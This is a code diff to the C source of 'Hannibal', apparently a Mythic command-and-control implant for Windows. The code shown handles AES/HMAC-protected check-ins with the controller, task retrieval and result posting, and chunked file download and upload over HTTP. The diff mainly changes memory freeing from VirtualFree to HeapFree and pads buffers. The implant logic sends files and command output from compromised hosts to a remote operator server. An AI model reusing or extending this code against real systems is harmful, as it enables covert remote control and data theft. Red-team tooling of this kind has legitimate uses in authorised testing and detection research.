@@ -120,7 +120,7 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_encrypt(uint8_t *buffer,
 
     crypto_hmac_sha256(padded_key, 32, iv_msg, sizeof(iv) + ciphertext_size, digest, 32);
 
-    hannibal_instance_ptr->Win32.VirtualFree(iv_msg, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, iv_msg);
 
     // Format as Mythic HTTP expects
     int encode_buffer_size = pic_strlen(hannibal_instance_ptr->config.uuid) + sizeof(iv) + ciphertext_size + sizeof(digest);
@@ -134,8 +134,8 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_encrypt(uint8_t *buffer,
     pic_memcpy(encode_buffer + pic_strlen(hannibal_instance_ptr->config.uuid) + sizeof(iv), ciphertext, ciphertext_size);
     pic_memcpy(encode_buffer + pic_strlen(hannibal_instance_ptr->config.uuid) + sizeof(iv) + ciphertext_size, digest, sizeof(digest));
 
-    hannibal_instance_ptr->Win32.VirtualFree(ciphertext, 0, MEM_RELEASE);
-    hannibal_instance_ptr->Win32.VirtualFree(buffer, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, ciphertext);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, buffer);
 
     // Encode to Base64
 
@@ -146,13 +146,13 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_encrypt(uint8_t *buffer,
 
     LPVOID b64_encode_out = {0};
 
-    b64_encode_out = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, base64_size); // Freed in calling function
+    b64_encode_out = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, base64_size + 16); // Freed in calling function
     
     base64_encode(encode_buffer, encode_buffer_size, b64_encode_out);
 
     int len = pic_strlen(b64_encode_out);
 
-    hannibal_instance_ptr->Win32.VirtualFree(encode_buffer, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, encode_buffer);
 
 
     MYTHIC_HTTP_ENCRYPTION_MSG ret;
@@ -192,14 +192,14 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_decrypt(uint8_t *buffer,
     // Decode from B64
 
     // Freed below
-
-    LPVOID b64_decoded_response = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, binary_size);
+    // Added 16 pad bytes due to writing past end of buffer and causing HeapFree issues
+    LPVOID b64_decoded_response = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, binary_size + 16);
 
     pic_RtlSecureZeroMemory(b64_decoded_response, binary_size);
 
     base64_decode(buffer, buffer_size, b64_decoded_response);
 
-    hannibal_instance_ptr->Win32.VirtualFree(buffer, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, buffer);
 
     // Locate each element in the buffer
 
@@ -244,7 +244,7 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_decrypt(uint8_t *buffer,
         digest, sizeof(digest)
     );
 
-    hannibal_instance_ptr->Win32.VirtualFree(iv_msg, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, iv_msg);
 
 
     int hash_match = MemCompare(hmac, digest, sizeof(digest));
@@ -274,7 +274,7 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_decrypt(uint8_t *buffer,
         LPVOID decrypt_buffer = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, message_size);
         pic_memcpy(decrypt_buffer, message_ptr, message_size);
         
-        hannibal_instance_ptr->Win32.VirtualFree(b64_decoded_response, 0, MEM_RELEASE);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, b64_decoded_response);
 
 
         struct AES_ctx ctx;
@@ -1266,7 +1266,7 @@ SECTION_CODE SERIALIZE_POST_TASKS_INFO serialize_post_tasks(UINT8 *buffer, int b
     WriteUint32(&buffer_cursor, buffer_size);
     WriteBytes(&buffer_cursor, buffer, buffer_size);
 
-    hannibal_instance_ptr->Win32.VirtualFree(buffer, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, buffer);
 
     SERIALIZE_POST_TASKS_INFO ret;
     ret.buffer = content_buffer;
@@ -1381,7 +1381,7 @@ SECTION_CODE void mythic_http_checkin()
                 integrity_level = 0;
             }
         
-            hannibal_instance_ptr->Win32.VirtualFree(pLabel, 0, MEM_RELEASE);
+            hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, pLabel);
         } 
     }
 
@@ -1431,8 +1431,8 @@ SECTION_CODE void mythic_http_checkin()
 
     from_utility_http_wininet_msg checkin_response = http_wininet_request(send_msg);
 
-    hannibal_instance_ptr->Win32.VirtualFree(serialized_buffer, 0, MEM_RELEASE);
-    hannibal_instance_ptr->Win32.VirtualFree(send_msg.content, 0, MEM_RELEASE);
+    // hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, serialized_buffer);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, send_msg.content);
 
 
     ///////////////////////////////////////////////////////////// Parse Checkin Response
@@ -1456,8 +1456,8 @@ SECTION_CODE void mythic_http_checkin()
 
     // If message corrupted/tampered with/other error
     if(dec_resp.buffer == NULL){
-        hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(checkin_response.content, 0, MEM_RELEASE);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, dec_resp.buffer);
+        // hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, checkin_response.content);
         return;
     }
 
@@ -1472,9 +1472,9 @@ SECTION_CODE void mythic_http_checkin()
         }
     }
 
-    hannibal_instance_ptr->Win32.VirtualFree(resp, 0, MEM_RELEASE);
-    hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);
-    hannibal_instance_ptr->Win32.VirtualFree(checkin_response.content, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, resp);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, dec_resp.buffer);
+    // hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, checkin_response.content);
 
 }
 
@@ -1514,9 +1514,9 @@ SECTION_CODE void mythic_http_get_tasks()
 
     from_utility_http_wininet_msg get_tasks_response = http_wininet_request(send_msg);
 
-    hannibal_instance_ptr->Win32.VirtualFree(serialized_buffer, 0, MEM_RELEASE);
-    hannibal_instance_ptr->Win32.VirtualFree(enc_resp.buffer, 0, MEM_RELEASE);
-    hannibal_instance_ptr->Win32.VirtualFree(send_msg.content, 0, MEM_RELEASE);
+    // hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, serialized_buffer);
+    // hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, enc_resp.buffer);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, send_msg.content);
 
     ///////////////////////////////////////////////////////////// Parse response
 
@@ -1539,7 +1539,7 @@ SECTION_CODE void mythic_http_get_tasks()
         deserialize_get_tasks_response(buffer_copy);
     }
 
-    hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, dec_resp.buffer);
 
 }
 
@@ -1566,7 +1566,7 @@ SECTION_CODE void mythic_http_post_tasks()
     HANNIBAL_INSTANCE_PTR
 
     // TODO: Add way to check that we can connect to controller before
-    // dequeing a task. So task responses aren't lost.
+    // dequeuing a task. So task responses aren't lost.
 
 #ifdef INCLUDE_CMD_DOWNLOAD
     if(hannibal_instance_ptr->tasks.download_count > 0){
@@ -1587,8 +1587,8 @@ SECTION_CODE void mythic_http_post_tasks()
 
         SERIALIZE_POST_TASKS_INFO pt = serialize_post_tasks(post_task.output, post_task.output_size, post_task.task_uuid);
 
-        hannibal_instance_ptr->Win32.VirtualFree(post_task.output, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(post_task.task_uuid, 0, MEM_RELEASE);
+        // hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, post_task.output);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, post_task.task_uuid);
 
 
         MYTHIC_HTTP_ENCRYPTION_MSG enc_resp = mythic_http_aes_encrypt(pt.buffer, pt.buffer_size);
@@ -1608,10 +1608,10 @@ SECTION_CODE void mythic_http_post_tasks()
 
         // TODO: Parse response and if it did not succeed, requeue the task response to try again.
 
-        hannibal_instance_ptr->Win32.VirtualFree(pt.buffer, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(enc_resp.buffer, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(send_msg.content, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(post_tasks_response.content, 0, MEM_RELEASE);
+        // hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, pt.buffer);
+        // hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, enc_resp.buffer);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, send_msg.content);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, post_tasks_response.content);
 
     }
 
@@ -1676,8 +1676,8 @@ SECTION_CODE void mythic_http_start_file_download(FILE_DOWNLOAD *download)
     if (hannibal_instance_ptr->tasks.download_count >= CONCURRENT_FILE_DOWNLOADS){
 
         hannibal_response(L"Exceeded queue limit.", download->task_uuid);
-        hannibal_instance_ptr->Win32.VirtualFree(download->path, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(download, 0, MEM_RELEASE);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, download->path);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, download);
 
         return;
     }
@@ -1695,8 +1695,8 @@ SECTION_CODE void mythic_http_start_file_download(FILE_DOWNLOAD *download)
 
         hannibal_response(error_messageW, download->task_uuid);
 
-        hannibal_instance_ptr->Win32.VirtualFree(download->path, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(download, 0, MEM_RELEASE);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, download->path);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, download);
 
         return;
     }
@@ -1769,9 +1769,9 @@ SECTION_CODE void mythic_http_start_file_download(FILE_DOWNLOAD *download)
 
     from_utility_http_wininet_msg init_download_response = http_wininet_request(send_msg);
 
-    hannibal_instance_ptr->Win32.VirtualFree(download->task_uuid, 0, MEM_RELEASE);
-    hannibal_instance_ptr->Win32.VirtualFree(serialized_buffer, 0, MEM_RELEASE);
-    hannibal_instance_ptr->Win32.VirtualFree(send_msg.content, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, download->task_uuid);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, serialized_buffer);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, send_msg.content);
     hannibal_instance_ptr->Win32.CloseHandle(hFile);
 
     /////////////////////////// PARSE INIT DOWNLOAD RESPONSE
@@ -1811,8 +1811,8 @@ SECTION_CODE void mythic_http_start_file_download(FILE_DOWNLOAD *download)
     // Queue the download. This copies the data from the download struct. So freeing download is fine.
     hannibal_instance_ptr->tasks.file_downloads[hannibal_instance_ptr->tasks.download_count - 1] = *download;
 
-    hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);
-    hannibal_instance_ptr->Win32.VirtualFree(download, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, dec_resp.buffer);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, download);
 
 }
 
@@ -1908,12 +1908,12 @@ SECTION_CODE void mythic_http_continue_file_downloads()
 
             from_utility_http_wininet_msg continue_download_response = http_wininet_request(send_msg);
 
-            hannibal_instance_ptr->Win32.VirtualFree(send_msg.content, 0, MEM_RELEASE);
+            hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, send_msg.content);
             hannibal_instance_ptr->Win32.CloseHandle(hFile);
 
             // Check was success
             if(continue_download_response.content == NULL){
-                hannibal_instance_ptr->Win32.VirtualFree(chunk_buffer, 0, MEM_RELEASE);
+                hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, chunk_buffer);
                 continue; // Try the next queued download
             }
 
@@ -1924,8 +1924,8 @@ SECTION_CODE void mythic_http_continue_file_downloads()
 
             // If message corrupted/tampered with/other error
             if(dec_resp.buffer == NULL){
-                hannibal_instance_ptr->Win32.VirtualFree(chunk_buffer, 0, MEM_RELEASE);
-                hannibal_instance_ptr->Win32.VirtualFree(continue_download_response.content, 0, MEM_RELEASE);
+                hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, chunk_buffer);
+                hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, continue_download_response.content);
                 return;
             }
 
@@ -1933,9 +1933,9 @@ SECTION_CODE void mythic_http_continue_file_downloads()
 
             // TODO: Cleanup these types
             if(message_type != MESSAGE_TYPE_START_DOWNLOAD){
-                hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);
-                hannibal_instance_ptr->Win32.VirtualFree(continue_download_response.content, 0, MEM_RELEASE);
-                hannibal_instance_ptr->Win32.VirtualFree(chunk_buffer, 0, MEM_RELEASE);
+                hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, dec_resp.buffer);
+                hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, continue_download_response.content);
+                hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, chunk_buffer);
                 return NULL;
             }
 
@@ -1947,9 +1947,9 @@ SECTION_CODE void mythic_http_continue_file_downloads()
                 hannibal_instance_ptr->tasks.file_downloads[i].chunks_sent += 1;
 
                 if (bytes_read < FILE_DOWNLOAD_CHUNK_SIZE){ // EOF
-                    hannibal_instance_ptr->Win32.VirtualFree(hannibal_instance_ptr->tasks.file_downloads[i].task_uuid, 0, MEM_RELEASE);
-                    hannibal_instance_ptr->Win32.VirtualFree(hannibal_instance_ptr->tasks.file_downloads[i].download_uuid, 0, MEM_RELEASE);
-                    hannibal_instance_ptr->Win32.VirtualFree(hannibal_instance_ptr->tasks.file_downloads[i].path, 0, MEM_RELEASE);
+                    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, hannibal_instance_ptr->tasks.file_downloads[i].task_uuid);
+                    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, hannibal_instance_ptr->tasks.file_downloads[i].download_uuid);
+                    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, hannibal_instance_ptr->tasks.file_downloads[i].path);
                     hannibal_instance_ptr->tasks.file_downloads[i].bytes_sent = 0;
                     hannibal_instance_ptr->tasks.file_downloads[i].chunks_sent = 0;
                     hannibal_instance_ptr->tasks.file_downloads[i].chunk_count = 0;
@@ -1958,8 +1958,8 @@ SECTION_CODE void mythic_http_continue_file_downloads()
                 }
             } 
 
-            hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);
-            hannibal_instance_ptr->Win32.VirtualFree(chunk_buffer, 0, MEM_RELEASE);
+            hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, dec_resp.buffer);
+            hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, chunk_buffer);
 
         } else {
             continue;
@@ -1989,9 +1989,9 @@ SECTION_CODE void mythic_http_start_file_upload(FILE_UPLOAD *upload)
 
     if (hannibal_instance_ptr->tasks.upload_count >= CONCURRENT_FILE_DOWNLOADS){
         hannibal_response(L"Exceeded upload queue limit.", upload->task_uuid);
-        hannibal_instance_ptr->Win32.VirtualFree(upload->path, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(upload->upload_uuid, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(upload, 0, MEM_RELEASE);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, upload->path);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, upload->upload_uuid);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, upload);
         return;
     }
 
@@ -2018,16 +2018,16 @@ SECTION_CODE void mythic_http_start_file_upload(FILE_UPLOAD *upload)
         dword_to_wchar(error_code, code_buffer, 10);
         pic_strcatW(error_message, code_buffer);
         hannibal_response(error_message, upload->task_uuid);
-        hannibal_instance_ptr->Win32.VirtualFree(upload->path, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(upload->upload_uuid, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(upload, 0, MEM_RELEASE);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, upload->path);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, upload->upload_uuid);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, upload);
         return;
     }
 
     hannibal_instance_ptr->tasks.upload_count += 1;
     hannibal_instance_ptr->tasks.file_uploads[hannibal_instance_ptr->tasks.upload_count - 1] = *upload;
 
-    hannibal_instance_ptr->Win32.VirtualFree(upload, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, upload);
 
     hannibal_instance_ptr->Win32.CloseHandle(hFile);
     
@@ -2126,7 +2126,7 @@ SECTION_CODE void mythic_http_continue_file_uploads()
 
             from_utility_http_wininet_msg continue_upload_response = http_wininet_request(send_msg);
 
-            hannibal_instance_ptr->Win32.VirtualFree(send_msg.content, 0, MEM_RELEASE);
+            hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, send_msg.content);
 
             if(continue_upload_response.content == NULL){
                 continue; // Try the next queued upload
@@ -2174,9 +2174,9 @@ SECTION_CODE void mythic_http_continue_file_uploads()
             }
 
             if (bytes_written < FILE_UPLOAD_CHUNK_SIZE) { //EOF
-                hannibal_instance_ptr->Win32.VirtualFree(hannibal_instance_ptr->tasks.file_uploads[i].path, 0, MEM_RELEASE);
-                hannibal_instance_ptr->Win32.VirtualFree(hannibal_instance_ptr->tasks.file_uploads[i].task_uuid, 0, MEM_RELEASE);
-                hannibal_instance_ptr->Win32.VirtualFree(hannibal_instance_ptr->tasks.file_uploads[i].upload_uuid, 0, MEM_RELEASE);
+                hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, hannibal_instance_ptr->tasks.file_uploads[i].path);
+                hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, hannibal_instance_ptr->tasks.file_uploads[i].task_uuid);
+                hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, hannibal_instance_ptr->tasks.file_uploads[i].upload_uuid);
                 hannibal_instance_ptr->tasks.file_uploads[i].bytes_received = 0;
                 hannibal_instance_ptr->tasks.file_uploads[i].chunk_count = 0;
                 hannibal_instance_ptr->tasks.file_uploads[i].chunks_received = 0;
@@ -2184,8 +2184,8 @@ SECTION_CODE void mythic_http_continue_file_uploads()
                 hannibal_instance_ptr->tasks.upload_count -= 1;
             } 
 
-            hannibal_instance_ptr->Win32.VirtualFree(continue_upload_response.content, 0, MEM_RELEASE);
-            hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);
+            hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, continue_upload_response.content);
+            hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, dec_resp.buffer);
 
             hannibal_instance_ptr->Win32.CloseHandle(hFile);
 
